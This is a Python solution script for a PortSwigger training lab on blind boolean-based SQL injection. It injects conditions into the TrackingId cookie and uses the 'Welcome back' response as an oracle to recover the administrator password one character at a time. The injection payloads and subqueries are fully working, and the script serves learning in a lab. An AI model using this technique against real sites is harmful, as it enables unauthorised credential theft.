#!/usr/bin/env python3
"""
Solve the PortSwigger lab "Blind SQL injection with conditional responses".

The TrackingId cookie is dropped into a SQL query whose results are never
shown — but the page prints "Welcome back" whenever that query returns a
row. That yes/no signal is a boolean oracle: inject a condition, and the
presence of "Welcome back" tells you whether it was true. This script uses
the oracle to extract the administrator's password one character at a time.

Lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
Usage: python3 solve.py https://YOUR-LAB-ID.web-security-academy.net
"""

import sys
import string
import argparse
import requests

# Verify TLS against the OS trust store (works on networks that inspect HTTPS).
import truststore
truststore.inject_into_ssl()

session = requests.Session()
LAB_URL = None  # set from the CLI arg in main()
REQUEST_TIMEOUT = 10

# Printed only when the injected query returns a row (condition was true).
TRUE_MARKER = "Welcome back"

# The lab states the password is lowercase letters + digits.
CHARSET = string.ascii_lowercase + string.digits


def fetch(path, method="GET", cookies=None, allow_redirects=True):
    """Send a request to the lab and return the response."""
    url = LAB_URL.rstrip("/") + "/" + path.lstrip("/")
    return session.request(method, url, cookies=cookies,
                           timeout=REQUEST_TIMEOUT, allow_redirects=allow_redirects)


def report(name, found, detail=""):
    """Print a finding in a consistent [FOUND] / [clean] format."""
    tag = "FOUND" if found else "clean"
    print(f"[{tag}] {name}: {detail}")


def oracle(tracking_id, subquery, expected):
    """Ask the app one yes/no question.

    Injects  <tracking_id>' AND (<subquery>)='<expected>  into the cookie.
    Returns True if the page comes back with the 'Welcome back' marker,
    which means the subquery returned <expected>.
    """
    payload = f"{tracking_id}' AND ({subquery})='{expected}"
    resp = fetch("/", cookies={"TrackingId": payload})
    return TRUE_MARKER in resp.text


def check_blind_sqli():
    # The app assigns us a TrackingId; our injection appends to that value.
    fetch("/")
    tracking_id = session.cookies.get("TrackingId")

    # Phase 1 — find the password length.
    print("[*] Determining password length...")
    n = 1
    while True:
        if oracle(tracking_id,
                  f"SELECT 'a' FROM users WHERE username='administrator' "
                  f"AND LENGTH(password)>{n}",
                  "a"):
            n += 1
        else:
            length = n
            break
    print(f"[*] Password length: {length}")

    # Phase 2 — recover one character at a time.
    print("[*] Extracting password, one character at a time...")
    password = ""
    for position in range(1, length + 1):
        found = False
        for char in CHARSET:
            if oracle(tracking_id,
                      f"SELECT SUBSTRING(password,{position},1) "
                      f"FROM users WHERE username='administrator'",
                      char):
                password += char
                found = True
                print(f"    [{position}/{length}] {password}")
                break
        if not found:
            report("Blind SQLi", False, f"no character matched at position {position}")
            return

    print()
    report("Blind SQLi", True, f"administrator password: {password}")

def parse_args():
    parser = argparse.ArgumentParser(
        description="Extract a password via blind boolean-based SQL injection (PortSwigger lab)."
    )
    parser.add_argument(
        "url",
        help="Base URL of your lab instance, e.g. https://XXXX.web-security-academy.net",
    )
    return parser.parse_args()


def main():
    global LAB_URL
    args = parse_args()
    LAB_URL = args.url

    try:
        check_blind_sqli()
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()